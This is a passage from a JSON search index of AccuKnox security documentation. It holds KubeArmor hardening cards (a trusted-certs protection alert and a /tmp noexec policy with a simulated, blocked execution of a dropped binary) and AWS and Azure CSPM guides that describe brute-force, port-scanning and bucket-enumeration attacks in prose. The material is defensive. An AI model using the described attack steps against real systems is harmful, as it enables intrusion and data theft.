Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"aditya\",\n  \"ContainerID\": \"b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4\",\n  \"ContainerImage\": \"docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae\",\n  \"ContainerName\": \"mysql\",\n  \"Data\": \"syscall=SYS_RMDIR\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"aditya\",\n  \"HostPID\": 24462,\n  \"HostPPID\": 24411,\n  \"Labels\": \"app=mysql\",\n  \"Message\": \"Credentials modification denied\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"mysql\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 185,\n  \"PPID\": 179,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"PodName\": \"mysql-74775b4bf4-65nqf\",\n  \"PolicyName\": \"harden-mysql-trusted-cert-mod\",\n  \"ProcessName\": \"/bin/rmdir\",\n  \"Resource\": \"/etc/ssl/certs\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/bin/rmdir certs\",\n  \"Tags\": \"MITRE,MITRE_T1552_unsecured_credentials,FGT1555,FIGHT\",\n  \"Timestamp\": 1696320102,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-03T08:01:42.373810Z\",\n  \"cluster_id\": \"3896\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/Trusted-certs-bundle/#references","title":"References","text":"<p>MITRE Subvert Trust ControlsMITRE Unsecured credentialsPOODLE AttackBEAST.)</p>"},{"location":"use-cases/cards/_tmp_-noexec/","title":"/tmp/ noexec","text":"<p>Do not allow execution of binaries from /tmp/ folder.</p>"},{"location":"use-cases/cards/_tmp_-noexec/#narrative","title":"Narrative","text":"<p>If provided the necessary privileges, users have the ability to install software in organizational information systems. To maintain control over the types of software installed, organizations identify permitted and prohibited actions regarding software installation. Prohibited software installations may include, for example, software with unknown or suspect pedigrees or software that organizations consider potentially malicious.</p>"},{"location":"use-cases/cards/_tmp_-noexec/#attack-scenario","title":"Attack Scenario","text":"<p>In an attack scenario, a hacker may attempt to inject malicious scripts into the /tmp folder through a web application exploit. Once the script is uploaded, the attacker may try to execute it on the server in order to take it down. By hardening the /tmp folder, the attacker will not be able to execute the script, preventing such attacks. It's essential to implement these security measures to protect against these types of attacks and ensure the safety of the system. Attack Type System Failure, System Breach Actual Attack Shields Health Care Group data breach, MOVEit Breach</p>"},{"location":"use-cases/cards/_tmp_-noexec/#compliance","title":"Compliance","text":"<ul> <li>CIS Distribution Independent Linuxv2.0</li> <li>Control-Id: 1.1.5</li> <li>Control-Id: 1.1.10</li> </ul>"},{"location":"use-cases/cards/_tmp_-noexec/#policy","title":"Policy","text":""},{"location":"use-cases/cards/_tmp_-noexec/#tmp-noexec_1","title":"/tmp/ noexec","text":"<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-block-exec-inside-tmp\n  namespace: wordpress-mysql\nspec:\n  tags:\n  - config-files\n  message: Alert! Execution attempted inside tmp folder\n  selector:\n    matchLabels:\n      app: wordpress\n  process:\n    matchPatterns:\n    - pattern: /tmp/*\n    - pattern: /var/tmp/*\n  action: Block\n</code></pre>"},{"location":"use-cases/cards/_tmp_-noexec/#simulation","title":"Simulation","text":"<pre><code>root@wordpress-fb448db97-wj7n7:/var/tmp# ls /var/tmp                                                                    xvzf                                                                                                                    \nroot@wordpress-fb448db97-wj7n7:/var/tmp# /var/tmp/xvzf                                                                  \nbash: /var/tmp/xvzf: Permission denied                                                                                  \nroot@wordpress-fb448db97-wj7n7:/var/tmp#  \n</code></pre>"},{"location":"use-cases/cards/_tmp_-noexec/#expected-alert","title":"Expected Alert","text":"<pre><code>{\n  \"Action\": \"Block\",\n  \"ClusterName\": \"d3mo\",\n  \"ContainerID\": \"548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"ContainerName\": \"wordpress\",\n  \"Data\": \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC\",\n  \"Enforcer\": \"AppArmor\",\n  \"HostName\": \"master-node\",\n  \"HostPID\": 30490,\n  \"HostPPID\": 6119,\n  \"Labels\": \"app=wordpress\",\n  \"Message\": \"Alert! Execution attempted inside /tmp\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"Operation\": \"File\",\n  \"Owner\": {\n    \"Name\": \"wordpress\",\n    \"Namespace\": \"wordpress-mysql\",\n    \"Ref\": \"Deployment\"\n  },\n  \"PID\": 193,\n  \"PPID\": 6119,\n  \"ParentProcessName\": \"/var/lib/rancher/k3s/data/24a53467e274f21ca27cec302d5fbd58e7176daf0a47a2c9ce032ee877e0979a/bin/containerd-shim-runc-v2\",\n  \"PodName\": \"wordpress-fb448db97-wj7n7\",\n  \"PolicyName\": \"ksp-block-exec-inside-tmp\",\n  \"ProcessName\": \"/bin/bash\",\n  \"Resource\": \"/tmp/sh-thd-2512146865\",\n  \"Result\": \"Permission denied\",\n  \"Severity\": \"1\",\n  \"Source\": \"/bin/bash\",\n  \"Tags\": \"CIS,CIS_Linux\",\n  \"Timestamp\": 1696492433,\n  \"Type\": \"MatchedPolicy\",\n  \"UpdatedTime\": \"2023-10-05T07:53:53.259403Z\",\n  \"cluster_id\": \"2302\",\n  \"component_name\": \"kubearmor\",\n  \"instanceGroup\": \"0\",\n  \"instanceID\": \"0\",\n  \"tenant_id\": \"167\",\n  \"workload\": \"1\"\n}\n</code></pre>"},{"location":"use-cases/cards/_tmp_-noexec/#references","title":"References","text":"<p>STIG no exec in /tmpThe biggest ransomeware attacks in historyShields Healthcare Group Data Breach</p>"},{"location":"use-cases/cloud/aws-compute/","title":"AWS Compute Security","text":"<p>As organizations increasingly rely on Amazon EC2 (Elastic Compute Cloud) for scalable computing, securing these environments is essential. EC2 instances host critical applications and sensitive data, making them prime targets for cyber threats. Ensuring the security of EC2 instances helps protect against data breaches, unauthorized access, and application downtime.</p>"},{"location":"use-cases/cloud/aws-compute/#why-ec2-security-with-accuknox","title":"Why EC2 Security with AccuKnox","text":"<p>AccuKnox Cloud Security Posture Management (CSPM) offers continuous monitoring and real-time detection of misconfigurations and vulnerabilities in your EC2 environment. With AccuKnox, you can proactively identify and address security issues, ensuring that your EC2 instances remain secure and compliant with industry standards. AccuKnox helps simplify security management by providing actionable insights, automated ticketing for remediation, and seamless integration with your existing workflows.</p>"},{"location":"use-cases/cloud/aws-compute/#attack-scenario","title":"Attack Scenario","text":"<p>Securing EC2 instances is a multi-faceted challenge. Below are some examples of common security issues that can expose EC2 instances to attacks:</p> <ul> <li> <p>Public IP Address + Unencrypted EBS Volumes: When EC2 instances are assigned public IP addresses, they become accessible over the internet, potentially exposing them to unauthorized access and attacks. If these instances also have unencrypted EBS volumes, sensitive data stored on these volumes is vulnerable. Attackers can gain access to the instance and exfiltrate unencrypted data, leading to a severe security breach.</p> </li> <li> <p>ELBv2 Unhealthy Instances + ELBv2 Minimum Number of EC2 Target Instances: Misconfigurations in the Elastic Load Balancer (ELB) can lead to availability issues. For example, if an ELB is configured to require a minimum number of healthy EC2 instances (e.g., two), and one of the instances becomes unhealthy, the remaining instance could fail, resulting in application downtime or poor performance.</p> </li> </ul> <p>It's crucial to address these issues proactively to prevent potential breaches.</p>"},{"location":"use-cases/cloud/aws-compute/#how-to-identify-and-remediate-ec2-security-issues","title":"How to Identify and Remediate EC2 Security Issues","text":""},{"location":"use-cases/cloud/aws-compute/#1-public-ip-address-unencrypted-ebs-volumes","title":"1. Public IP Address + Unencrypted EBS Volumes","text":"<p>Identification:</p> <ul> <li> <p>Navigate to Findings: Log into the AccuKnox portal and go to Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the Cloud Findings filter and search for the keyword Public IP or Unencrypted EBS to highlight any findings related to exposed public IPs and unencrypted disks.</p> </li> <li> <p>Review Findings: Analyze the findings to identify any EC2 instances with a public IP address and unencrypted EBS volumes. Pay special attention to the risk severity of these issues.</p> </li> <li> <p>Assess Risk: Evaluate the potential risks of public exposure and unencrypted storage, which can lead to unauthorized access and data breaches.</p> </li> </ul> <p></p> <p>Remediation:</p> <ul> <li> <p>Access Findings: In the Findings section, select the specific finding related to Public IP Address + Unencrypted EBS Volumes.</p> </li> <li> <p>Create a Ticket: Create a ticket to track the remediation process and ensure the issue is addressed.</p> </li> <li> <p>Follow Remediation Guidance:</p> <ul> <li> <p>For Public IP Exposure: Remove public IP addresses where unnecessary or secure them using firewalls or security groups.</p> </li> <li> <p>For Unencrypted EBS Volumes: Enable encryption on the identified EBS volumes to protect sensitive data.</p> </li> </ul> </li> <li> <p>Validate Remediation: Confirm that public IP addresses have been removed or secured and EBS volumes are encrypted.</p> </li> <li> <p>Monitor Continuously: Regularly check for similar findings to ensure continuous protection.</p> </li> </ul> <p></p>"},{"location":"use-cases/cloud/aws-compute/#2-elbv2-unhealthy-instances-elbv2-minimum-number-of-ec2-target-instances","title":"2. ELBv2 Unhealthy Instances + ELBv2 Minimum Number of EC2 Target Instances","text":"<p>Identification:</p> <ul> <li> <p>Navigate to Findings: Go to the Findings section in the AccuKnox portal under Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the Cloud Findings filter and search for ELBv2 and Unhealthy Instances to identify any misconfigurations in load balancer setups.</p> </li> <li> <p>Review Findings: Examine the findings to detect any ELBv2 configurations with unhealthy instances or issues related to the minimum number of healthy target instances.</p> </li> <li> <p>Assess Risk: Understand the availability risk if the minimum number of healthy instances is not met, which could cause downtime or application unresponsiveness.</p> </li> </ul> <p></p> <p>Remediation:</p> <ul> <li> <p>Access Findings: From the Findings section, select the finding related to ELBv2 Unhealthy Instances + ELBv2 Minimum Number of EC2 Target Instances.</p> </li> <li> <p>Create a Ticket: Open a ticket to monitor and track the remediation efforts for fixing ELBv2 health configurations.</p> </li> <li> <p>Follow Remediation Guidance</p> </li> <li> <p>Validate Remediation: Check the status of the EC2 instances and ELBv2 configurations to verify that all instances are healthy and the minimum target instances are configured correctly.</p> </li> </ul> <p></p>"},{"location":"use-cases/cloud/aws-iam/","title":"AWS IAM Security","text":"<p>AWS Identity and Access Management (IAM) is crucial for managing access to AWS resources. Securing IAM configurations is vital to prevent unauthorized access, privilege escalation, and data breaches. Weak credentials, poor password policies, and improper IAM roles can expose your AWS environment to significant risks.</p> <p>AccuKnox CSPM provides continuous monitoring and real-time detection of vulnerabilities and misconfigurations in AWS IAM configurations. It helps you identify weak credentials and misconfigured permissions, delivering actionable insights and automated remediation workflows to ensure compliance and robust security posture.</p> <p>One common IAM misconfiguration is the use of weak passwords or lack of multi-factor authentication (MFA) for critical user accounts. Without strong credentials and MFA in place, attackers can easily compromise IAM accounts, gaining unauthorized access to sensitive AWS resources. This highlights the importance of enforcing robust password policies and enabling MFA for all users with access to critical infrastructure.</p>"},{"location":"use-cases/cloud/aws-iam/#why-weak-iam-credentials-are-a-risk","title":"Why Weak IAM Credentials are a Risk","text":"<p>When IAM credentials are weak, attackers can easily exploit them to gain unauthorized access to AWS resources. This opens the door to various security threats, including:</p> <ul> <li> <p>Unauthorized Access: Weak passwords or improper credential management can allow attackers to gain control of critical resources.</p> </li> <li> <p>Privilege Escalation: Attackers can leverage weak credentials to escalate privileges and gain broader access within the AWS environment.</p> </li> <li> <p>Data Breaches: Attackers exploiting weak IAM credentials can access, steal, or manipulate sensitive data, resulting in significant operational and financial damage.</p> </li> </ul>"},{"location":"use-cases/cloud/aws-iam/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker scans for weak IAM credentials and attempts to brute-force passwords using tools like Hydra. If the password is weak or default, the attacker can gain unauthorized access to the AWS environment. Once inside, they could escalate privileges to access more sensitive resources or launch attacks, such as data exfiltration or manipulation.</p>"},{"location":"use-cases/cloud/aws-iam/#how-to-identify-and-remediate-weak-iam-credentials-with-accuknox","title":"How to Identify and Remediate Weak IAM Credentials with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword password to list relevant findings.</p> </li> <li> <p>Review Findings: Assess the severity of findings related to weak credentials, including lack of multi-factor authentication (MFA) or poor password complexity requirements.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided within the platform to enforce strong IAM credentials and ensure MFA is enabled.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/aws-iam/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to Issues &gt; Findings in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to weak IAM credentials or non-compliance with password policies.</p> </li> <li> <p>Create a ticket to track the remediation process.</p> </li> <li> <p>Follow recommended steps and security references linked within the findings to strengthen IAM credential security, including implementing MFA and enforcing complex password policies.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/aws-iam/#best-practices-to-avoid-weak-iam-credential-risks","title":"Best Practices to Avoid Weak IAM Credential Risks","text":"<ul> <li> <p>Enforce Strong Password Policies: Ensure that IAM users follow strict password length, complexity, and expiration rules.</p> </li> <li> <p>Enable MFA: Require multi-factor authentication for all IAM users and accounts.</p> </li> <li> <p>Regularly Audit IAM Permissions: Continuously review and audit IAM user roles and permissions to ensure least-privilege access.</p> </li> <li> <p>Monitor IAM Security Continuously: Use AccuKnox CSPM to monitor IAM configurations for real-time detection and remediation of misconfigurations.</p> </li> </ul> <p>By addressing weak IAM credentials proactively and following best practices, you can significantly reduce the risk of unauthorized access and maintain a secure AWS environment.</p>"},{"location":"use-cases/cloud/aws-network/","title":"AWS Network Security","text":"<p>As organizations increasingly rely on AWS for their cloud infrastructure, securing network configurations is critical to safeguarding cloud resources. Misconfigurations in network security settings, such as publicly exposed ports, open security groups, or misconfigured VPC security settings, can serve as potential entry points for attackers. Ensuring a robust AWS network security posture is essential to protect resources, prevent unauthorized access, and secure cloud applications from threats.</p> <p>AccuKnox Cloud Security Posture Management (CSPM) helps identify misconfigurations in AWS network settings and provides actionable recommendations to mitigate risks, ensuring compliance with security standards and enhancing overall network security.</p> <p>One major security challenge with AWS Network Security is the exposure of Open SSH ports. Misconfigurations in security group settings or improperly secured SSH access can allow attackers to exploit these open ports, potentially gaining unauthorized access to critical systems. It is essential to address these vulnerabilities proactively to safeguard your environment from brute force attacks, unauthorized access, and lateral movement within your network.</p>"},{"location":"use-cases/cloud/aws-network/#why-open-ssh-ports-are-a-risk","title":"Why Open SSH Ports are a Risk","text":"<p>When SSH ports are publicly exposed, attackers can exploit them to:</p> <ul> <li> <p>Brute Force Attacks: Attackers use tools to guess SSH credentials, gaining unauthorized access.</p> </li> <li> <p>Resource Hijacking: Compromised machines can be used for malicious activities like crypto mining or botnets.</p> </li> <li> <p>Lateral Movement: Once inside, attackers can move laterally within your environment to access more systems.</p> </li> </ul>"},{"location":"use-cases/cloud/aws-network/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker scans for publicly exposed SSH ports using tools like Nmap or Shodan. If the SSH configuration lacks strong authentication, they launch brute-force attacks using tools like Hydra or Medusa to crack credentials. Once successful, the attacker gains control over the EC2 instance, compromising its resources and potentially infiltrating the entire network.</p> <p></p>"},{"location":"use-cases/cloud/aws-network/#how-to-identify-and-remediate-open-ssh-ports-with-accuknox","title":"How to Identify and Remediate Open SSH Ports with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the Cloud Findings filter and search for the keyword \"ssh\" to locate findings related to open SSH ports.</p> </li> <li> <p>Group Findings: Group the findings to identify all publicly exposed SSH ports for efficient analysis.</p> </li> <li> <p>Review Findings Analyze the severity of each finding and assess the potential risk</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/aws-network/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Identify Open SSH Ports: Select the findings related to publicly exposed SSH ports.</p> </li> <li> <p>Create a Ticket: Create a ticket to track the resolution process.</p> </li> <li> <p>Follow Guidance: Follow the recommended security steps provided within the platform to restrict access to SSH ports.</p> </li> <li> <p>Verify Configuration: Ensure that SSH ports are no longer publicly accessible and have strong authentication mechanisms enabled.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/aws-network/#best-practices-to-avoid-open-ssh-port-risks","title":"Best Practices to Avoid Open SSH Port Risks","text":"<ul> <li> <p>Restrict SSH access to trusted IP addresses using security groups.</p> </li> <li> <p>Use key-based authentication instead of passwords to secure SSH access.</p> </li> <li> <p>Monitor SSH login attempts and set up fail2ban or similar tools to prevent brute-force attacks.</p> </li> <li> <p>Continuously monitor your environment with AccuKnox CSPM for real-time detection and remediation of misconfigurations.</p> </li> </ul>"},{"location":"use-cases/cloud/aws-storage/","title":"AWS Storage Security","text":"<p>Amazon Web Services (AWS) offers a wide range of storage solutions, including S3, EBS, and EFS, which are essential for securing and storing data in the cloud. Securing these storage services is crucial to protect sensitive information and maintain the integrity of your applications. AWS Storage Security involves identifying and addressing vulnerabilities, misconfigurations, and threats that can expose data to unauthorized access or compromise.</p> <p>AccuKnox Cloud Security Posture Management (CSPM) helps provide continuous monitoring and real-time detection of misconfigurations and vulnerabilities across your AWS storage resources. It delivers actionable insights and automated remediation workflows to ensure compliance with security best practices.</p> <p>One common security challenge in AWS storage is the public exposure of S3 buckets or unencrypted EBS volumes. These misconfigurations can leave sensitive data vulnerable to unauthorized access and exploitation, making it essential to address them proactively.</p>"},{"location":"use-cases/cloud/aws-storage/#why-s3-public-exposure-is-a-risk","title":"Why S3 Public Exposure is a Risk","text":"<p>Public exposure to S3 buckets can lead to data breaches, information leakage, and regulatory non-compliance. Attackers can exploit publicly accessible buckets to download, modify, or delete data. This can result in significant financial and reputational damage, as well as legal consequences if sensitive data is leaked.</p>"},{"location":"use-cases/cloud/aws-storage/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker can enumerate publicly accessible S3 buckets to check for sensitive data. If they find a misconfigured bucket with public access, they may steal confidential files, such as customer information, financial data, or proprietary business information. This could lead to identity theft, fraud, or intellectual property theft.</p> <p></p>"},{"location":"use-cases/cloud/aws-storage/#how-to-identify-and-remediate-s3-public-exposure-with-accuknox","title":"How to Identify and Remediate S3 Public Exposure with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Access the AccuKnox portal and go to Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the Cloud Findings filter and search for the keyword \"s3\" or \"public\" to list relevant findings for publicly exposed S3 buckets.</p> </li> <li> <p>Review Findings: Analyze the identified findings to check for any publicly exposed S3 buckets and evaluate the associated risks.</p> </li> </ol> <p></p> <p>Remediation Steps</p> <ol> <li> <p>Identify the Finding: Locate the finding related to S3 Public Exposure.</p> </li> <li> <p>Create a Ticket: Create a ticket to track the resolution process.</p> </li> <li> <p>Follow Remediation Guidance: Follow the recommended steps within the platform to properly configure the S3 bucket access, ensuring it's no longer publicly accessible.</p> </li> <li> <p>Verify Resolution: Confirm that the S3 bucket access has been restricted and the issue has been resolved.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/aws-storage/#best-practices-to-avoid-s3-public-exposure","title":"Best Practices to Avoid S3 Public Exposure","text":"<ul> <li> <p>Regularly audit the access control settings of S3 buckets to ensure they are not publicly accessible.</p> </li> <li> <p>Implement bucket-level policies to restrict access only to authorized users.</p> </li> <li> <p>Enable logging and versioning on S3 buckets to monitor access and recover data in case of a breach.</p> </li> <li> <p>Continuously monitor your cloud environment with AccuKnox CSPM for real-time detection and remediation of misconfigurations.</p> </li> </ul>"},{"location":"use-cases/cloud/aws/","title":"AWS Use Cases","text":""},{"location":"use-cases/cloud/aws/#aws-use-cases","title":"AWS Use Cases","text":"<p>IAM Security</p> <p>Network Security</p> <p>Compute Security</p> <p>Storage Security</p> <p>AccuKnox's Cloud Security Posture Management (CSPM) enhances the security of AWS cloud environments by continuously monitoring for misconfigurations and compliance issues. It provides actionable insights to mitigate risks in real-time, ensuring a secure and compliant cloud infrastructure. By addressing vulnerabilities proactively, organizations can maintain robust cloud security and meet regulatory requirements efficiently.</p>"},{"location":"use-cases/cloud/aws/#why-use-accuknox-cspm-for-aws","title":"Why Use AccuKnox CSPM for AWS?","text":"<p>AccuKnox CSPM helps identify and resolve potential vulnerabilities in AWS environments, ensuring security breaches are prevented before they occur. It simplifies compliance by providing continuous monitoring aligned with frameworks like GDPR, HIPAA, and ISO. With risk-based prioritization, CSPM enables organizations to focus on addressing critical issues, while assistive remediation streamlines issue resolution. Additionally, it enhances visibility into dynamic cloud environments, uncovering hidden risks and offering in-depth insights for improved decision-making.</p> <p>Key Benefits:</p> <ul> <li> <p>Misconfigurations: Identifies and reports issues before they turn into vulnerabilities.</p> </li> <li> <p>Complex Cloud Environments: Reveals hidden risks arising from changing AWS architectures.</p> </li> <li> <p>Risk-Based Prioritization: Focuses on fixing the most critical misconfigurations first.</p> </li> <li> <p>Continuous Compliance Monitoring: Offers real-time updates for ongoing compliance with AWS security policies.</p> </li> <li> <p>Automated Ticketing: Automatically creates tickets for needed fixes to ensure timely action.</p> </li> </ul> <p>AccuKnox CSPM provides real-time monitoring to detect security gaps and compliance violations, ensuring immediate action can be taken. It categorizes findings by severity, prioritizing critical risks for efficient resource allocation. The platform integrates seamlessly with existing ticketing systems, simplifying workflows and improving operational efficiency. Detailed reports and actionable insights guide teams through remediation steps, making it easy to address issues effectively.</p> <p>To maximize the effectiveness of AccuKnox CSPM, regularly monitor the Cloud Posture Management dashboard to stay informed about new findings and compliance reports. Focus on addressing high-risk issues promptly to mitigate potential vulnerabilities. Continuous monitoring ensures your AWS cloud environment remains secure and compliant over time.</p>"},{"location":"use-cases/cloud/azure-compute/","title":"Azure Compute Security","text":"<p>Azure Virtual Machines (VMs) are integral to cloud-based operations, hosting critical applications and sensitive data. Ensuring their security is vital to prevent unauthorized access, data breaches, and operational downtime.</p> <p>AccuKnox CSPM provides continuous monitoring and real-time detection of vulnerabilities and misconfigurations in Azure VMs. It delivers actionable insights and automated remediation workflows, ensuring compliance with security standards and robust protection against potential threats.</p> <p>One major security challenge with Azure VMs lies in publicly exposed VM disks. These misconfigurations can leave sensitive data vulnerable to exploitation, making it essential to address them proactively.</p>"},{"location":"use-cases/cloud/azure-compute/#why-is-vm-disk-public-access-a-risk","title":"Why is VM Disk Public Access a Risk","text":"<p>When a VM disk is publicly exposed, it becomes a target for malicious attackers. Unauthorized access can lead to:</p> <ul> <li> <p>Data Exposure: Sensitive data can be copied or leaked.</p> </li> <li> <p>Malicious Modifications: Attackers may alter files, plant malware, or tamper with critical system configurations.</p> </li> <li> <p>Compliance Violations: Exposure violates compliance standards like GDPR, HIPAA, or ISO, leading to potential legal and financial repercussions.</p> </li> </ul>"},{"location":"use-cases/cloud/azure-compute/#attack-scenario","title":"Attack Scenario","text":"<p>An attacker uses scanning tools to scan the Internet for publicly accessible VM disks. Upon finding a vulnerable disk, they gain access, exfiltrate sensitive data, or plant malicious files. This can result in data breaches, operational disruptions, or financial losses.</p> <p></p>"},{"location":"use-cases/cloud/azure-compute/#how-to-identify-and-remediate-vm-disk-public-access-with-accuknox","title":"How to Identify and Remediate VM Disk Public Access with AccuKnox","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access <code>Issues &gt; Findings</code>.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword vm disk to list relevant findings.</p> </li> <li> <p>Review Findings: Analyze identified public VM disk access and assess the associated risk severity.</p> </li> <li> <p>Take Action: Follow the remediation guidance provided within the platform to secure exposed disks.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-compute/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to <code>Issues &gt; Findings</code> in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to VM Disk Public Access.</p> </li> <li> <p>Create a ticket to track the resolution process.</p> </li> <li> <p>Follow the recommended steps and security references linked within the findings for precise remediation.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-compute/#best-practices-to-avoid-vm-disk-public-access","title":"Best Practices to Avoid VM Disk Public Access","text":"<ul> <li> <p>Regularly audit VM disk permissions and ensure they are not publicly accessible.</p> </li> <li> <p>Apply least-privilege access principles to restrict disk access.</p> </li> <li> <p>Monitor your cloud environment continuously using AccuKnox CSPM for real-time detection of misconfigurations</p> </li> </ul>"},{"location":"use-cases/cloud/azure-database/","title":"Azure Database Security","text":"<p>As organizations continue to move their data to the cloud, securing Azure databases is crucial to protect sensitive data and maintain the integrity of applications. Misconfigurations in database security settings can expose critical data to unauthorized access, data breaches, and potential exploitation. Ensuring that Azure databases are properly configured and secured is a key aspect of a comprehensive cloud security strategy.</p>"},{"location":"use-cases/cloud/azure-database/#why-azure-database-security-with-accuknox","title":"Why Azure Database Security with AccuKnox","text":"<p>AccuKnox Cloud Security Posture Management (CSPM) provides continuous monitoring of Azure database configurations to identify misconfigurations, vulnerabilities, and non-compliance with security best practices. With AccuKnox, organizations can proactively remediate database security risks, ensuring that their databases are secure, compliant, and protected against potential threats.</p>"},{"location":"use-cases/cloud/azure-database/#common-misconfiguration","title":"Common Misconfiguration","text":"<p>Common misconfigurations in Azure Database Security can expose databases to risks such as unauthorized access, data leakage, and compliance violations. Below are some typical vulnerabilities:</p> <ul> <li> <p>SQL Server Firewall Rule Alerts: Misconfigured firewall rules can leave SQL Server databases exposed to the internet, allowing attackers to gain unauthorized access or launch attacks.</p> </li> <li> <p>PostgreSQL Flexible Server Logging: If logging is not enabled, database activities like unauthorized access or data modifications may go undetected, increasing the potential for security breaches.</p> </li> </ul>"},{"location":"use-cases/cloud/azure-database/#how-to-identify-and-remediate-sql-server-firewall-rule-alerts-with-accuknox","title":"How to Identify and Remediate SQL Server Firewall Rule Alerts with AccuKnox","text":"<ul> <li> <p>Access the Dashboard: Log in to the AccuKnox portal and navigate to Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the cloud findings filter and search for the keyword \"SQL Server firewall\" to list relevant findings.</p> </li> <li> <p>Review Findings: Analyze the identified SQL Server firewall rule misconfigurations and assess the severity and associated risks.</p> </li> <li> <p>Remediate: Follow the detailed remediation steps to secure the firewall rules.</p> </li> </ul> <p></p> <p>Remediation Steps for SQL Server Firewall Rule Alerts</p> <ol> <li> <p>Review the identified SQL Server firewall rule misconfigurations in the AccuKnox findings.</p> </li> <li> <p>Create a ticket to track the resolution process.</p> </li> <li> <p>Follow the recommended steps and security references linked within the findings to properly configure the firewall rules.</p> </li> <li> <p>Verify remediation by checking the updated firewall settings in the AccuKnox portal.</p> </li> </ol> <p></p> <p>Best Practices to Avoid SQL Server Firewall Rule Issues</p> <ul> <li> <p>Restrict SQL Server firewall rules to only necessary IP addresses.</p> </li> <li> <p>Regularly audit firewall settings to ensure they align with security best practices.</p> </li> <li> <p>Continuously monitor firewall configurations using AccuKnox CSPM for real-time detection of misconfigurations.</p> </li> </ul>"},{"location":"use-cases/cloud/azure-database/#how-to-identify-if-postgresql-flexible-server-logging-is-enabled-in-azure","title":"How to Identify if PostgreSQL Flexible Server Logging is Enabled in Azure","text":"<ol> <li> <p>Navigate to Findings: Go to the AccuKnox portal and access Issues &gt; Findings.</p> </li> <li> <p>Apply Filters: Use the Cloud Findings filter in the findings-type filter and search for PostgreSQL findings.</p> </li> <li> <p>Review Findings: Analyze the identified findings to see if logging is disabled or improperly configured. The status of PostgreSQL Flexible Server logging will be highlighted in the findings.</p> </li> <li> <p>Search Specific Assets/Findings: You can directly search for PostgreSQL-related assets or findings using the search field.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-database/#remediation-steps","title":"Remediation Steps","text":"<ol> <li> <p>Navigate to Issues &gt; Findings in the AccuKnox portal.</p> </li> <li> <p>Select the finding related to PostgreSQL Flexible Server Logging to identify misconfigurations.</p> </li> <li> <p>Create a Ticket to track the resolution process.</p> </li> <li> <p>Follow the Recommended Steps: Check the remediation guidance provided within the platform to enable or configure logging properly.</p> </li> </ol> <p></p>"},{"location":"use-cases/cloud/azure-database/#best-practices","title":"Best Practices","text":"<ul> <li> <p>Ensure logging is enabled for PostgreSQL Flexible Server to capture all relevant database activities.</p> </li> <li> <p>Regularly audit PostgreSQL configurations and logging settings for compliance with security standards.</p> </li> <li> <p>Monitor PostgreSQL-related findings continuously for security risks using AccuKnox CSPM.</p> </li> </ul>"},{"location":"use-cases/cloud/azure-network/","title":"Azure Network Security","text":"<p>As organizations increasingly adopt cloud services, securing their cloud networks is essential. In Azure, misconfigurations in network security settings can lead to significant security risks. Publicly exposed network ports, misconfigured security groups, or open firewall rules can all serve as entry points for attackers. Ensuring a robust Azure Network Security posture is crucial for protecting resources, preventing unauthorized access, and ensuring the overall security of cloud applications.</p>"},{"location":"use-cases/cloud/azure-network/#why-azure-network-security-with-accuknox","title":"Why Azure Network Security with AccuKnox","text":"<p>AccuKnox Cloud Security Posture Management (CSPM) continuously monitors Azure environments for misconfigurations and vulnerabilities in network security settings. By leveraging AccuKnox, organizations can ensure that their Azure network configurations are compliant with security best practices, minimize exposure to threats, and receive actionable insights to remediate potential risks proactively.</p>"},{"location":"use-cases/cloud/azure-network/#attack-scenario","title":"Attack 